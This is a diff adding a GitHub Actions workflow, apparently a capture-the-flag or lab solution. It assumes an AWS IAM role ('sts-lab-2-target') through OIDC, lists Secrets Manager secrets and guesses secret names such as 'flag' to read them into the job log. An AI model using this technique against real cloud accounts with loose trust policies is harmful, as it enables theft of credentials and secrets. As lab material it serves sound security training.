@@ -1,0 +1,34 @@
+name: Assume AWS Role and Read Secret
+
+on:
+  workflow_dispatch:  # 手動觸發
+  push:
+    branches: [ main ]
+
+permissions:
+  id-token: write   # 必須：用於請求 OIDC token
+  contents: read
+
+jobs:
+  get-secret:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::067186171322:role/sts-lab-2-target
+          aws-region: us-east-1  # 根據實際情況調整
+          audience: sts.amazonaws.com  # 必須匹配信任策略
+
+      - name: List Secrets Manager Secrets
+        run: |
+          echo "Listing secrets..."
+          aws secretsmanager list-secrets
+
+      - name: Get Secret Value
+        run: |
+          # 嘗試讀取可能的 secret 名稱
+          # 你可能需要根據 list-secrets 的輸出調整
+          aws secretsmanager get-secret-value --secret-id flag || \
+          aws secretsmanager get-secret-value --secret-id sts-lab-2-flag || \
+          aws secretsmanager get-secret-value --secret-id challenge-flag
